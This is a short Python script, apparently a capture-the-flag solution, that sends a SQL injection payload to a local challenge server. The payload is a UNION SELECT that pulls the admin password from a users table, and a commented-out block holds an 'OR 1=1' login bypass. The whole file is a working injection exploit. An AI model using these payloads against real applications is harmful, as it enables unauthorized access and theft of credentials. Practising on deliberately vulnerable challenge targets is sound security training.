import requests

#session = requests.Session()
url = "http://challenge.localhost/"
payload1 = '" UNION SELECT password FROM users WHERE username=\'admin\' --'
#data = {
    #"user-handle": "admin",
    #"pin": "0 OR 1=1 --"
#}
params = {"query": payload1}
#session.post(url, data=data)
response = requests.get(url, params=params)
print(response.text)
